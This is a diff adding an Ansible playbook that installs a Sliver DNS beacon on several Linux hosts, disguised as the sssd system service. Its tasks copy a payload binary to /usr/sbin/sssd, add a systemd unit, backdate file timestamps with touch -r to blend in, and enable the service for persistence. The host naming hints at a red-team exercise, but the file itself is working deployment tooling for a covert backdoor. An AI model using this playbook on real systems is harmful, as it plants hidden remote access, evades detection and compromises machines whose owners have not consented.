@@ -1,0 +1,30 @@
+- name: Install sliver DNS beacon as a fake sssd service 
+  hosts: U18,U20,D10,F32,C7
+  tasks:
+  - name: Push the watershell executable
+    ansible.builtin.copy:
+      src: /opt/payloads/common/http-linux
+      dest: /usr/sbin/sssd
+      owner: root
+      group: root
+      mode: '755'
+  - name: Push the service config file
+    ansible.builtin.copy:
+      src: /opt/payloads/common/sssd.service
+      dest: /lib/systemd/system/sssd.service
+      owner: root
+      group: root
+      mode: '644'
+  - name: Put things in place and set dates to blend in 
+    ansible.legacy.shell: |
+      touch -r /usr/sbin/cron /usr/sbin/sssd
+      touch -r /lib/systemd/system/sockets.target.wants /lib/systemd/system/sssd.service
+      if ! test -L /etc/systemd/system/sssd.service; then
+        ln -s /lib/systemd/system/sssd.service /etc/systemd/system/sssd.service
+        touch -hr /etc/systemd/system/multi-user.target.wants /etc/systemd/system/sssd.service
+      fi
+      systemctl daemon-reload
+      systemctl enable sssd
+      systemctl restart sssd
+    args:
+      executable: /bin/bash
